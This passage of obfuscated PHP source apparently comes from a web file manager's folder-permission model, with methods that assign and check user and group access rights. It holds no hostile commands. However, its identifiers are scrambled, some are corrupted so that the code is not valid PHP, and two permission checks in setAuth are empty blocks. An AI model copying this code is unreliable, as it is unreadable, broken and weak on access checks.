$ÂÕûˆß[$Ÿ‘ñÖÂŒ[477]]); $É·¹š¶Ş = Model($Ÿ‘ñÖÂŒ[2154])->where($±ÍÑÏÖ÷)->field($Ÿ‘ñÖÂŒ[2163])->find(); if (!$É·¹š¶Ş) { return !1; } $Ìî°ŸŸš = array($Ÿ‘ñÖÂŒ[828] => $ÂÕûˆß[$Ÿ‘ñÖÂŒ[828]]); if ($ÂÕûˆß[$Ÿ‘ñÖÂŒ[828]] == $Ÿ‘ñÖÂŒ[2159] && $É·¹š¶Ş[$Ÿ‘ñÖÂŒ[828]] == $Ÿ‘ñÖÂŒ[2159]) { $Ìî°ŸŸš[$Ÿ‘ñÖÂŒ[828]] = 0; } $¹¨¯¯Û = Model($Ÿ‘ñÖÂŒ[2154])->where($±ÍÑÏÖ÷)->save($Ìî°ŸŸš); if ($ÂÕûˆß[$Ÿ‘ñÖÂŒ[828]] == $Ÿ‘ñÖÂŒ[512]) { if ($É·¹š¶Ş[$Ÿ‘ñÖÂŒ[543]] != $Ÿ‘ñÖÂŒ[230] && $this->shareFileMeta($É·¹š¶Ş[$Ÿ‘ñÖÂŒ[543]])) { $this->shareFileMeta($É·¹š¶Ş[$Ÿ‘ñÖÂŒ[543]], 0); } $this->remove($É·¹š¶Ş[$Ÿ‘ñÖÂŒ[670]]); return !0; } if ($¹¨¯¯Û && $ÂÕûˆß[$Ÿ‘ñÖÂŒ[828]] == $Ÿ‘ñÖÂŒ[2159]) { $ğ§Ç ïõ = $Ìî°ŸŸš[$Ÿ‘ñÖÂŒ[828]] == $Ÿ‘ñÖÂŒ[2159] ? 1 : 0; $this->shareFileMeta($É·¹š¶Ş[$Ÿ‘ñÖÂŒ[543]], $ğ§Ç ïõ); $this->removeByFile($É·¹š¶Ş[$Ÿ‘ñÖÂŒ[543]]); } return $¹¨¯¯Û; } private function removeByFile($Áà¶–îı) { $¹Ë˜Ùßš =& $_SERVER[¶Ô„œ…¯]; $“ÀÛ­ç™ = Model($¹Ë˜Ùßš[903])->where(array($¹Ë˜Ùßš[543] => $Áà¶–îı))->field($¹Ë˜Ùßš[193])->select(); $‰µùûòÚ = array_to_keyvalue($“ÀÛ­ç™, $¹Ë˜Ùßš[12], $¹Ë˜Ùßš[193]); $Õ‚¾ìœÌ = array($¹Ë˜Ùßš[193] => array($¹Ë˜Ùßš[7], $‰µùûòÚ), $¹Ë˜Ùßš[564] => 1); $“ÀÛ­ç™ = $this->where($Õ‚¾ìœÌ)->field($¹Ë˜Ùßš[670])->select(); if (empty($“ÀÛ­ç™)) { return; } $Ä£‹ãÈ = array_to_keyvalue($“ÀÛ­ç™, $¹Ë˜Ùßš[12], $¹Ë˜Ùßš[670]); $this->remove($Ä£‹ãÈ); } private function shareFileMeta($Áèåôñ, $ä†ÆÛ‹Ö = null) { $áÄğîÒä =& $_SERVER[¶Ô„œ…¯]; $å‰å‚± = array($áÄğîÒä[543] => $Áèåôñ, $áÄğîÒä[97] => $áÄğîÒä[2164]); if (is_null($ä†ÆÛ‹Ö)) { return Model($áÄğîÒä[2165])->where($å‰å‚±)->find(); } $å‰å‚±[$áÄğîÒä[452]] = $ä†ÆÛ‹Ö; Model($áÄğîÒä[2165])->add($å‰å‚±, array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = "\151\x6f\137\x73\157\165\162\x63\145\x5f\141\165\164\x68"; public function getAuth($‘Øö¶Áë) { $ Í–‚ÄÔ =& $_SERVER[¶Ô„œ…¯]; $…Š¦£ù¶ = $this->sourceAuthSelect($‘Øö¶Áë); $ªë‰³Å¼ = array(); $×Í„èü¶ = array(); $¹âÑÜüî = 2 << 25; foreach ($…Š¦£ù¶ as $¹êª·Ö) { $£şøÓ¦è = Model($ Í–‚ÄÔ[573])->listData($¹êª·Ö[$ Í–‚ÄÔ[2088]]); if (!$£şøÓ¦è) { continue; } $ªë‰³Å¼[] = $¹êª·Ö; $õ†Œ¨•ë = 0; if ($¹êª·Ö[$ Í–‚ÄÔ[190]] == SourceModel::TYPE_GROUP) { $õ†Œ¨•ë = $¹âÑÜüî * 2; } if ($¹êª·Ö[$ Í–‚ÄÔ[190]] == SourceModel::TYPE_USER) { $õ†Œ¨•ë = $¹âÑÜüî; } if ($¹êª·Ö[$ Í–‚ÄÔ[190]] == SourceModel::TYPE_USER && $¹êª·Ö[$ Í–‚ÄÔ[571]] == $ Í–‚ÄÔ[230]) { $õ†Œ¨•ë = 0; } $×Í„èü¶[] = $£şøÓ¦è[$ Í–‚ÄÔ[489]] + $õ†Œ¨•ë; } array_multisort($×Í„èü¶, SORT_DESC, $ªë‰³Å¼); return $ªë‰³Å¼; } public function sourceAuthSelect($ªƒ¿¶ä) { $Ï¹“à¿ =& $_SERVER[¶Ô„œ…¯]; static $´¿ûó™ = array(); $®üóÙ = is_array($ªƒ¿¶ä) ? !1 : !0; if ($®üóÙ) { $ªƒ¿¶ä = array($ªƒ¿¶ä); } $“ÄÃ¼Á‰ = array(); foreach ($ªƒ¿¶ä as $Á¦Ã®¦) { if (isset($´¿ûó™[$Á¦Ã®¦])) { $“ÄÃ¼Á‰[$Á¦Ã®¦] = $´¿ûó™[$Á¦Ã®¦]; } } if (count($“ÄÃ¼Á‰) == count($ªƒ¿¶ä)) { return $®üóÙ ? $“ÄÃ¼Á‰[$ªƒ¿¶ä[0]] : $“ÄÃ¼Á‰; } $²ïàÔ¡Î = $Ï¹“à¿[2166]; $¥õƒ—äÈ = array($Ï¹“à¿[193] => array($Ï¹“à¿[7], $ªƒ¿¶ä)); $ÌÛÇóÈÔ = $this->field($²ïàÔ¡Î)->order($Ï¹“à¿[477])->where($¥õƒ—äÈ)->select(); $‰¯ğÃªê = array_to_keyvalue_group($ÌÛÇóÈÔ, $Ï¹“à¿[193]); foreach ($ªƒ¿¶ä as $Á¦Ã®¦) { $´¿ûó™[$Á¦Ã®¦] = $‰¯ğÃªê[$Á¦Ã®¦] ? $‰¯ğÃªê[$Á¦Ã®¦] : array(); } if ($®üóÙ) { return $ÌÛÇóÈÔ; } return $‰¯ğÃªê; } public function setAuth($¸ãòê¾, $”‹•–‡ˆ) { $êôÌ­¯ =& $_SERVER[¶Ô„œ…¯]; $ğ¡‘Ã¸Ä = Model($êôÌ­¯[1428])->sourceInfo($¸ãòê¾); if (!$ğ¡‘Ã¸Ä) { return !1; } if ($ğ¡‘Ã¸Ä[$êôÌ­¯[190]] != SourceModel::TYPE_GROUP) { return !1; } $°ãò¿ë = 1; $êÓò·³  = $ğ¡‘Ã¸Ä[$êôÌ­¯[571]]; if ($êÓò·³  != $°ãò¿ë) { $Ã²‡éÑ¸ = array($êôÌ­¯[1980] => $êÓò·³ ); $ŞıÍãšÇ = Model($êôÌ­¯[2074])->field($êôÌ­¯[1780])->where($Ã²‡éÑ¸)->select(); $ŞıÍãšÇ = array_to_keyvalue($ŞıÍãšÇ, $êôÌ­¯[12], $êôÌ­¯[1780]); } $«å÷¸›  = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $¦ôÏ…²£ = array(); foreach ($”‹•–‡ˆ as $ËÒù ŒÜ) { if (!in_array($ËÒù ŒÜ[$êôÌ­¯[190]], $«å÷¸› )) { show_json(LNG($êôÌ­¯[2167]), !1); } if ($êÓò·³  != $°ãò¿ë) { if ($ËÒù ŒÜ[$êôÌ­¯[190]] == SourceModel::TYPE_GROUP) { } if ($ËÒù ŒÜ[$êôÌ­¯[571]] != 0 && !in_array($ËÒù ŒÜ[$êôÌ­¯[571]], $ŞıÍãšÇ)) { } } if ($ËÒù ŒÜ[$êôÌ­¯[571]] == 0) { $ËÒù ŒÜ[$êôÌ­¯[190]] = SourceModel::TYPE_USER; } $¦ôÏ…²£[] = array($êôÌ­¯[193] => $¸ãòê¾, $êôÌ­¯[190] => intval($ËÒù ŒÜ[$êôÌ­¯[190]]), $êôÌ­¯[571] => intval($ËÒù ŒÜ[$êôÌ­¯[571]]), $êôÌ­¯[2088] => intval($ËÒù ŒÜ[$êôÌ­¯[2088]]) ? intval($ËÒù ŒÜ[$êôÌ­¯[2088]]) : 0, $êôÌ­¯[2149] => intval($ËÒù ŒÜ[$êôÌ­¯[2149]]) ? intval($ËÒù ŒÜ[$êôÌ­¯[2149]]) : -1); } $this->where(array($êôÌ­¯[493] => $¸ãòê¾))->delete(); $this->addAll($¦ôÏ…²£); return !0; } public function authClear($óŸøÓ‘ ) { $¢È‡úıŠ =& $_SERVER[¶Ô„œ…¯]; $ù’™ÑõÓ = Model($¢È‡úıŠ[1428])->sourceInfo($óŸøÓ‘ ); $ğ»•ÉÂ = array($óŸøÓ‘ ); if ($ù’™ÑõÓ[$¢È‡úıŠ[487]] == $¢È‡úıŠ[91]) { $î‰€çÁ» = array($¢È‡úıŠ[657] => array($¢È‡úıŠ[617], $ù’™ÑõÓ[$¢È‡úıŠ[586]] . $óŸøÓ‘  . $¢È‡úıŠ[618])); $ğ»•ÉÂ = Model($¢È‡úıŠ[1428])->field($¢È‡úıŠ[493])->where($î‰€çÁ»)->getField($¢È‡úıŠ[193], !0); $ğ»•ÉÂ[] = $óŸøÓ‘ ; } $this->where(array($¢È‡úıŠ[493] => array($¢È‡úıŠ[494], $ğ»•ÉÂ)))->delete(); return !0; } public function getAllChildren($Ñòª¾Ù¶) { $½±§Á³ò =& $_SERVER[¶Ô„œ…¯]; $Ìá¤ç„¨ = Model($½±§Á³ò[1428])->sourceInfo($Ñòª¾Ù¶); if ($Ìá¤ç„¨[$½±§Á³ò[487]] != $½±§Á³ò[91]) { return $this->sourceListAuth(array($Ñòª¾Ù¶)); } if ($Ìá¤ç„¨[$½±§Á³ò[190]] != SourceModel::TYPE_GROUP) { return array(); } $ğµ‘ü = 1; $îµ†µ·° = array($Ñòª¾Ù¶); if ($Ìá¤ç„¨[$½±§Á³ò[192]] == $½±§Á³ò[230] && $Ìá¤ç„¨[$½±§Á³ò[571]] != $ğµ‘ü) { $îµ†µ·° = $this->groupChidldAllRootSource($Ìá¤ç„¨[$½±§Á³ò[571]]); } $†ÓÆÜáµ = $this->field($½±§Á³ò[193])->group($½±§Á³ò[193])->select(); $†ÓÆÜáµ = array_to_keyvalue($†ÓÆÜáµ, $½±§Á³ò[12], $½±§Á³ò[193]); if (!$†ÓÆÜáµ) { return array(); } $ Èéã“ò = $½±§Á³ò[2168]; $İ²œé¦¾ = array($½±§Á³ò[193] => array($½±§Á³ò[7], $†ÓÆÜáµ), $½±§Á³ò[507] => $½±§Á³ò[230]); $äĞ¿Ìş = Model($½±§Á³ò[903])->field($ Èéã“ò)->where($İ²œé¦¾)->select(); $İÓ¡ïÌ¦ = array($Ñòª¾Ù¶); foreach ($äĞ¿Ìş as $Ü–Š‹í) { foreach ($îµ†µ·° as $¤«úõğ‰) { $„­¼ªì = $½±§Á³ò[50] . $¤«úõğ‰ . $½±§Á³ò[50]; $äåÍ´ü¦ = $Ü–Š‹í[$½±§Á³ò[586]] . $Ü–Š‹í[$½±§Á³ò[193]] . $½±§Á³ò[50]; if (strstr($äåÍ´ü¦, $„­¼ªì)) { $İÓ¡ïÌ¦[] = $Ü–Š‹í[$½±§Á³ò[193]]; break; } } } return $this->sourceListAuth($İÓ¡ïÌ¦); } private function sourceListAuth($á÷İ±¶¡) { $òü ªû =& $_SERVER[¶Ô„œ…¯]; $ï©ˆÂ‹´ = Model($òü ªû[1428])->sourceListInfo($á÷İ±¶¡, !0); $øÜÆµİ = $this->sourceAuthSelect($á÷İ±¶¡); $©»î¯ôô = array(); $³àãÉÙ‘ = array(); foreach ($ï©ˆÂ‹´ as $ê‚ôÓ³È) { unset($ê‚ôÓ³È[$òü ªû[531]]); unset($ê‚ôÓ³È[$òü ªû[529]]); unset($ê‚ôÓ³È[$òü ªû[489]]); unset($ê‚ôÓ³È[$òü ªû[90]]); $“î®È—ç = $øÜÆµİ[$ê‚ôÓ³È[$òü ªû[193]]]; if (!$“î®È—ç) { continue; } $ê‚ôÓ³È[$òü ªû[2169]] = $this->authTargetInfo($“î®È—ç); $ê‚ôÓ³È[$òü ªû[584]] = rtrim($ê‚ôÓ³È[$òü ªû[590]], $òü ªû[8]) . $òü ªû[8] . ltrim($ê‚ôÓ³È[$òü ªû[584]], $òü ªû[8]); $©»î¯ôô[] = $ê‚ôÓ³È; $Ğ©§ÒÆ¶ = count(explode($òü ªû[8], trim($ê‚ôÓ³È[$òü ªû[584]], $òü ªû[8]))); $³àãÉÙ‘[] = $Ğ©§ÒÆ¶ + ($ê‚ôÓ³È[$òü ªû[33]] == $òü ªû[78] ? 0 : 1000); } array_multisort($³àãÉÙ‘, SORT_ASC, $©»î¯ôô); return $©»î¯ôô; } private function groupChidldAllRootSource($ÌÅÜË‰¸) { $†’¼¡ =& $_SERVER[¶Ô„œ…¯]; $÷š‰š©Ù = Model($†’¼¡[2170])->groupChildrenAll($ÌÅÜË‰¸); $¨åôØÖê = array($†’¼¡[192] => 0, $†’¼¡[571] => array($†’¼¡[7], $÷š‰š©Ù), $†’¼¡[190] => SourceModel::TYPE_GROUP); $Õ‡åñ§¯ = Model($†’¼¡[903])->field($†’¼¡[193])->where($¨åôØÖê)->select(); $Õ‡åñ§¯ = array_to_keyvalue($Õ‡åñ§¯, $†’¼¡[12], $†’¼¡[193]); return $Õ‡åñ§¯; } private function authTargetInfo($‘üïñ‘) { $¦“¯ùüõ =& $_SERVER[¶Ô„œ…¯]; $—¿¦íÏ = array(); $îàƒâÇè = array(); $Íé·¸Ü = 2 << 25; foreach ($‘üïñ‘ as $åÏõ¥şã) { $†Åû‚‹¥ = Model($¦“¯ùüõ[573])->listData($åÏõ¥şã[$¦“¯ùüõ[2088]]); if (!$†Åû‚‹¥) { continue; } if ($åÏõ¥şã[$¦“¯ùüõ[190]] == SourceModel::TYPE_USER) { $Ò‘”ü° = Model($¦“¯ùüõ[579])->getInfoSimpleOuter($åÏõ¥şã[$¦“¯ùüõ[571]]); if ($Ò‘”ü°[$¦“¯ùüõ[1780]] == $¦“¯ùüõ[1280]) { continue; } if ($Ò‘”ü°[$¦“¯ùüõ[1780]] == $¦“¯ùüõ[230]) { $Ò‘”ü°[$¦“¯ùüõ[32]] = LNG($¦“¯ùüõ[2171]); } } else { $Ò‘”ü° = Model($¦“¯ùüõ[587])->getInfoSimple($åÏõ¥şã[$¦“¯ùüõ[571]]); } if (!$Ò‘”ü°) { continue; } $Ò‘”ü°[$¦“¯ùüõ[542]] = $†Åû‚‹¥; $—¿¦íÏ[] = $Ò‘”ü°; $ô÷âÀ´¡ = 0; if ($åÏõ¥şã[$¦“¯ùüõ[190]] == SourceModel::TYPE_GROUP) { $ô÷âÀ´¡ = $Íé·¸Ü * 2; } if ($åÏõ¥şã[$¦“¯ùüõ[190]] == SourceModel::TYPE_USER) { $ô÷âÀ´¡ = $Íé·¸Ü; } if ($åÏõ¥şã[$¦“¯ùüõ[190]] == SourceModel::TYPE_USER && $åÏõ¥şã[$¦“¯ùüõ[571]] == $¦“¯ùüõ[230]) { $ô÷âÀ´¡ = 0; } $îàƒâÇè[] = $†Åû‚‹¥[$¦“¯ùüõ[489]] + $ô÷âÀ´¡; } array_multisort($îàƒâÇè, SORT_DESC, $—¿¦íÏ); return $—¿¦íÏ; } public function getAllChildrenByUser($Ò‘Ìœ™–, $„Ç¤ÓÄ) { $«ŒÂêüÛ =& $_SERVER[¶Ô„œ…¯]; $’ş½ŒŞœ = Model($«ŒÂêüÛ[599])->getInfo($„Ç¤ÓÄ); if (!$„Ç¤ÓÄ || !$Ò‘Ìœ™– || !$’ş½ŒŞœ) { return array(); } $‡Ã†Ìéõ = Model($«ŒÂêüÛ[1428])->sourceInfo($Ò‘Ìœ™–); $²ÎÀ¼¬ = array(); $¾ÃïÚ¬Ã = 1; if ($‡Ã†Ìéõ[$«ŒÂêüÛ[192]] == $«ŒÂêüÛ[230] && $‡Ã†Ìéõ[$«ŒÂêüÛ[571]] != $¾ÃïÚ¬Ã && $this->groupContainUser($‡Ã†Ìéõ[$«ŒÂêüÛ[571]], $„Ç¤ÓÄ)) { foreach ($’ş½ŒŞœ[$«ŒÂêüÛ[2172]] as $Ä¢‰ìš¯) { $§šĞñú = Model($«ŒÂêüÛ[587])->getInfo($Ä¢‰ìš¯[$«ŒÂêüÛ[1980]]); $·ÆÑ„ û = Model($«ŒÂêüÛ[599])->getInfoSimpleOuter($„Ç¤ÓÄ); $·ÆÑ„ û[$«ŒÂêüÛ[542]] = $Ä¢‰ìš¯[$«ŒÂêüÛ[489]]; if (Model($«ŒÂêüÛ[573])->authCheckAction($Ä¢‰ìš¯[$«ŒÂêüÛ[489]][$«ŒÂêüÛ[489]], $«ŒÂêüÛ[2001])) { continue; } $·ğÌ§ó™ = array($«ŒÂêüÛ[32] => $«ŒÂêüÛ[1300] . $§šĞñú[$«ŒÂêüÛ[32]], $«ŒÂêüÛ[193] => $§šĞñú[$«ŒÂêüÛ[90]][$«ŒÂêüÛ[193]], $«ŒÂêüÛ[87] => KodIO::make($§šĞñú[$«ŒÂêüÛ[90]][$«ŒÂêüÛ[193]]), $«ŒÂêüÛ[192] => $«ŒÂêüÛ[230], $«ŒÂêüÛ[190] => $«ŒÂêüÛ[580], $«ŒÂêüÛ[33] => $«ŒÂêüÛ[621], $«ŒÂêüÛ[584] => $§šĞñú[$«ŒÂêüÛ[591]], $«ŒÂêüÛ[1980] => $§šĞñú[$«ŒÂêüÛ[1980]], $«ŒÂêüÛ[588] => $§šĞñú[$«ŒÂêüÛ[192]], $«ŒÂêüÛ[2169] => array($·ÆÑ„ û)); $²ÎÀ¼¬[$·ğÌ§ó™[$«ŒÂêüÛ[193]]] = $·ğÌ§ó™; } } $ŞÀ¤·±ˆ = array(); $ĞõÑù‹ş = $this->getAllChildren($Ò‘Ìœ™–); foreach ($ĞõÑù‹ş as $ã¸ıÄ‰) { $–Ñ‚õ² = !1; foreach ($ã¸ıÄ‰[$«ŒÂêüÛ[2169]] as $ª“íÆÁ) { if ($ª“íÆÁ[$«ŒÂêüÛ[1780]]) { if ($ª“íÆÁ[$«ŒÂêüÛ[1780]] == $„Ç¤ÓÄ) { $–Ñ‚õ² = !0; break; } } if ($ª“íÆÁ[$«ŒÂêüÛ[1980]]) { if ($this->groupContainUser($ª“íÆÁ[$«ŒÂêüÛ[1980]], $„Ç¤ÓÄ)) { $–Ñ‚õ² = !0; break; } } } if ($–Ñ‚õ²) { $ŞÀ¤·±ˆ[] = $ã¸ıÄ‰; } $¿¡§åÇ§ = $ã¸ıÄ‰[$«ŒÂêüÛ[193]]; if (isset($²ÎÀ¼¬[$¿¡§åÇ§])) { $ã¸ıÄ‰[$«ŒÂêüÛ[2169]][] = $²ÎÀ¼¬[$¿¡§åÇ§][0]; $²ÎÀ¼¬[$¿¡§åÇ§] = !1; } } $²ÎÀ¼¬ = array_filter(array_values($²ÎÀ¼¬)); $ŞÀ¤·±ˆ = array_merge($²ÎÀ¼¬, $ŞÀ¤·±ˆ); return $ŞÀ¤·±ˆ; } public function setAllChildrenByUser($¼íˆË»¯, $ä„Î­Ú, $öõÜÍë) { $Óı†ËÕ =& $_SERVER[¶Ô„œ…¯]; $‚ïå¾á = $this->getAllChildrenByUser($¼íˆË»¯, $ä„Î­Ú); if (!$öõÜÍë || !$‚ïå¾á) { return !1; } foreach ($‚ïå¾á as $Ôª«¶®) { $£½³Á“é = array(); foreach ($Ôª«¶®[$Óı†ËÕ[2169]] as $”ªØ½‚) { $‹Ìªœª = $”ªØ½‚[$Óı†ËÕ[542]]; $éèôº´“ = $”ªØ½‚[$Óı†ËÕ[1780]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $ëË­ÆÂÖ = $”ªØ½‚[$Óı†ËÕ[1780]] ? $”ªØ½‚[$Óı†ËÕ[1780]] : $”ªØ½‚[$Óı†ËÕ[1980]]; if ($”ªØ½‚[$Óı†ËÕ[1780]] && $”ªØ½‚[$Óı†ËÕ[1780]] == $ä„Î­Ú) { continue; } $£½³Á“é[] = array($Óı†ËÕ[193] => $Ôª«¶®[$Óı†ËÕ[193]], $Óı†ËÕ[190] => $éèôº´“, $Óı†ËÕ[571] => intval($ëË­ÆÂÖ), $Óı†ËÕ[2088] => isset($‹Ìªœª[$Óı†ËÕ[477]]) ? intval($‹Ìªœª[$Óı†ËÕ[477]]) : 0, $Óı†ËÕ[2149] => isset($‹Ìªœª[$Óı†ËÕ[2149]]) ? intval($‹Ìªœª[$Óı†ËÕ[2149]]) : -1); } $£½³Á“é[] = array($Óı†ËÕ[193] => $Ôª«¶®[$Óı†ËÕ[193]], $Óı†ËÕ[190] => SourceModel::TYPE_USER, $Óı†ËÕ[571] => intval($ä„Î­Ú), $Óı†ËÕ[2088] => intval($öõÜÍë), $Óı†ËÕ[2149] => -1); $this->where(array($Óı†ËÕ[493] => $Ôª«¶®[$Óı†ËÕ[193]]))->delete(); $this->addAll($£½³Á“é); } return !0; } public function get($µçÊ–“†) { $üğ’¸¿ = $this->getSourceList(array($µçÊ–“†), !0); return $üğ’¸¿[0]; } public function getSourceList($¿ÒÆ¾úˆ, $şàØµÓô = false, $èËáŸ˜† = false) { $ç¦“Éƒ¹ =& $_SERVER[¶Ô„œ…¯]; if (!$¿ÒÆ¾úˆ) { return array(); } $çî˜Ò“ = Model($ç¦“Éƒ¹[1428]); if (!$şàØµÓô && count($¿ÒÆ¾úˆ) == 1) { $şàØµÓô = array(); $şàØµÓô[$¿ÒÆ¾úˆ[0]] = $çî˜Ò“->sourceInfo($¿ÒÆ¾úˆ[0]); } if (!$şàØµÓô) { $‚×¨Õµ = array($ç¦“Éƒ¹[493] => array($ç¦“Éƒ¹[494], $¿ÒÆ¾úˆ)); $şàØµÓô = $çî˜Ò“->field($ç¦“Éƒ¹[2173])->where($‚×¨Õµ)->select(); $şàØµÓô = array_to_keyvalue($şàØµÓô, $ç¦“Éƒ¹[193]); } $¡ƒÉ™À = $¿ÒÆ¾úˆ; foreach ($şàØµÓô as $úÅ×…ë => $éè˜çœ) { $ŠƒÕë»» = $çî˜Ò“->parentLevelArray($éè˜çœ[$ç¦“Éƒ¹[586]]); $¡ƒÉ™À = array_merge($¡ƒÉ™À, array($úÅ×…ë), array_reverse($ŠƒÕë»»)); } $¡ƒÉ™À = array_values(array_unique($¡ƒÉ™À)); if (!$¡ƒÉ™À) { return array(); } $‰ˆ†¿£ê = $this->sourceAuthSelect($¡ƒÉ™À); $Õú©Äğ = array(); foreach ($¡ƒÉ™À as $şê–¨) { if (isset($‰ˆ†¿£ê[$şê–¨])) { $Õú©Äğ[$şê–¨] = $‰ˆ†¿£ê[$şê–¨]; } } $½§¤Üµü = $this->userIsRoot($èËáŸ˜†); $¶¶ÍÂ± = AuthModel::authAll(); $ˆÔ¿é× = array($ç¦“Éƒ¹[490] => $¶¶ÍÂ±, $ç¦“Éƒ¹[2174] => array($ç¦“Éƒ¹[495] => 0, $ç¦“Éƒ¹[1986] => $¶¶ÍÂ±, $ç¦“Éƒ¹[496] => LNG($ç¦“Éƒ¹[2175]), $ç¦“Éƒ¹[2003] => $ç¦“Éƒ¹[2176])); $ÚÊøûÏ = array(); foreach ($şàØµÓô as $şê–¨ => $ù³®–Ö§) { if ($½§¤Üµü && $GLOBALS[$ç¦“Éƒ¹[6]][$ç¦“Éƒ¹[1999]]) { $ÚÊøûÏ[$şê–¨] = $ˆÔ¿é×; continue; } $ÚÊøûÏ[$şê–¨] = $this->makeSourceAuth($ù³®–Ö§, $Õú©Äğ, $èËáŸ˜†); } return $ÚÊøûÏ; } public function authDeepCheck($­âùİ’¡, $¦İ‰÷è× = false) { $ƒğùÙÊı =& $_SERVER[¶Ô„œ…¯]; $¦İ‰÷è× = $¦İ‰÷è× ? $¦İ‰÷è× : USER_ID; $†£¯°ä¡ = $this->makeAuthDeep($¦İ‰÷è×); if (!in_array($­âùİ’¡, $†£¯°ä¡[$ƒğùÙÊı[2177]])) { return !1; } $£ÃŠ¾çõ = array(); foreach ($†£¯°ä¡[$ƒğùÙÊı[2178]] as $œ¶äŠ±£ => $¹õíÕ“è) { if (!in_array($­âùİ’¡, $¹õíÕ“è)) { continue; } $£ÃŠ¾çõ[] = $œ¶äŠ±£; } if (!$£ÃŠ¾çõ) { return !1; } $ùøÑ×Ëô = $£ÃŠ¾çõ ? $£ÃŠ¾çõ[0] : $­âùİ’¡; return array($ƒğùÙÊı[490] => -1, $ƒğùÙÊı[542] => array($ƒğùÙÊı[495] => $ƒğùÙÊı[1280], $ƒğùÙÊı[1986] => $ƒğùÙÊı[230], $ƒğùÙÊı[496] => LNG($ƒğùÙÊı[2179]), $ƒğùÙÊı[2003] => $ƒğùÙÊı[2180]), $ƒğùÙÊı[2181] => LNG($ƒğùÙÊı[2182]), $ƒğùÙÊı[2183] => $this->sourceAuthInfo($ùøÑ×Ëô)); } protected function makeAuthDeep($ÊÑÖ­Ô¥ = false) { $±®ò£ò =& $_SERVER[¶Ô„œ…¯]; static $ë™ƒ¿¯ = array(); $ÊÑÖ­Ô¥ = $ÊÑÖ­Ô¥ ? $ÊÑÖ­Ô¥ : USER_ID; if (isset($ë™ƒ¿¯[$ÊÑÖ­Ô¥])) { return $ë™ƒ¿¯[$ÊÑÖ­Ô¥]; } $²½¦ˆ–ğ = Model($±®ò£ò[2184])->listData(); $ŠšõıÏß = array(); foreach ($²½¦ˆ–ğ as $Î›íÀæÆ) { if ($Î›íÀæÆ[$±®ò£ò[489]] == 0 && $Î›íÀæÆ[$±®ò£ò[2002]] == $±®ò£ò[91]) { $ŠšõıÏß[] = $Î›íÀæÆ[$±®ò£ò[477]]; } } $×Ãş·œ” = $this->userGroupParents($ÊÑÖ­Ô¥); $ãÓÉ‚Ëø = array($±®ò£ò[190] => SourceModel::TYPE_USER, $±®ò£ò[571] => $ÊÑÖ­Ô¥); if ($×Ãş·œ”) { $ãÓÉ‚Ëø = array(array($±®ò£ò[190] => SourceModel::TYPE_USER, $±®ò£ò[571] => $ÊÑÖ­Ô¥), array($±®ò£ò[190] => SourceModel::TYPE_GROUP, $±®ò£ò[571] => array($±®ò£ò[494], $×Ãş·œ”)), $±®ò£ò[1084] => $±®ò£ò[2082]); } $Û¾æ¼® = $this->field($±®ò£ò[2185])->where($ãÓÉ‚Ëø)->select(); $Âµ¤°ÂÈ = array(); $††¿ˆû = array_to_keyvalue_group($Û¾æ¼®, $±®ò£ò[193]); foreach ($††¿ˆû as $ù€Ğ¹ê => $ø×ìçó) { $µ‹Ç“ƒ = $this->authArrayCheck($ø×ìçó, $ÊÑÖ­Ô¥); if ($µ‹Ç“ƒ[$±®ò£ò[490]] > 0) { $Âµ¤°ÂÈ[] = $ù€Ğ¹ê . $±®ò£ò[12]; } } if ($×Ãş·œ”) { $ç®ÁÒ™­ = Model($±®ò£ò[587]); foreach ($×Ãş·œ” as $Ÿ˜Ö‡Á’) { $êŞ¥Ğ­™ = $ç®ÁÒ™­->getInfo($Ÿ˜Ö‡Á’); if (!$êŞ¥Ğ­™ || !is_array($êŞ¥Ğ­™[$±®ò£ò[90]])) { continue; } $Âµ¤°ÂÈ[] = $êŞ¥Ğ­™[$±®ò£ò[90]][$±®ò£ò[193]]; } } $€ˆÆŒİ = array(); $ÔŒğ¾Ó† = $×Ãş·œ”; $å¦İ¢ç = Model($±®ò£ò[1428]); $ç®ÁÒ™­ = Model($±®ò£ò[587]); $Û‚Éæ‘™ = array(); $¬Â¹•ëÏ = array(); $ÈˆŒŠÖ± = array(); $Ç€¬¹œê = array(); if ($Âµ¤°ÂÈ) { $§Óâªšï = $å¦İ¢ç->where(array($±®ò£ò[193] => array($±®ò£ò[494], $Âµ¤°ÂÈ)))->select(); foreach ($§Óâªšï as $Œ¥¡ñíŞ) { $Àô•Óú = $å¦İ¢ç->parentLevelArray($Œ¥¡ñíŞ[$±®ò£ò[586]]); $€ˆÆŒİ = array_merge($€ˆÆŒİ, $Àô•Óú); $ÔŒğ¾Ó†[] = $Œ¥¡ñíŞ[$±®ò£ò[571]]; $Û‚Éæ‘™[$Œ¥¡ñíŞ[$±®ò£ò[193]]] = $Àô•Óú; $¬Â¹•ëÏ[$Œ¥¡ñíŞ[$±®ò£ò[193]]] = $Œ¥¡ñíŞ[$±®ò£ò[571]]; } } $ÔŒğ¾Ó† = array_values(array_unique($ÔŒğ¾Ó†)); $üÓîØƒ = $ÔŒğ¾Ó†; foreach ($üÓîØƒ as $Ÿ˜Ö‡Á’) { $êŞ¥Ğ­™ = $ç®ÁÒ™­->getInfo($Ÿ˜Ö‡Á’); $Àô•Óú = $å¦İ¢ç->parentLevelArray($êŞ¥Ğ­™[$±®ò£ò[586]]); $ÔŒğ¾Ó† = array_merge($ÔŒğ¾Ó†, $Àô•Óú); } $ÔŒğ¾Ó† = array_values(array_unique($ÔŒğ¾Ó†)); foreach ($ÔŒğ¾Ó† as $Ÿ˜Ö‡Á’) { $êŞ¥Ğ­™ = $ç®ÁÒ™­->getInfo($Ÿ˜Ö‡Á’); $€ˆÆŒİ[] = $êŞ¥Ğ­™[$±®ò£ò[90]][$±®ò£ò[193]]; $ÈˆŒŠÖ±[$Ÿ˜Ö‡Á’] = $êŞ¥Ğ­™[$±®ò£ò[90]][$±®ò£ò[193]]; $Ç€¬¹œê[$Ÿ˜Ö‡Á’] = $å¦İ¢ç->parentLevelArray($êŞ¥Ğ­™[$±®ò£ò[586]]); } foreach ($Û‚Éæ‘™ as $…İå€› => $şç›˜ÏÅ) { $ìôƒÙü = $¬Â¹•ëÏ[$…İå€›]; if (!$ìôƒÙü || !$ÈˆŒŠÖ±[$ìôƒÙü]) { continue; } $Ö±ßãÊé = array(); foreach ($Ç€¬¹œê[$ìôƒÙü] as $Ÿ˜Ö‡Á’) { $Ö±ßãÊé[] = 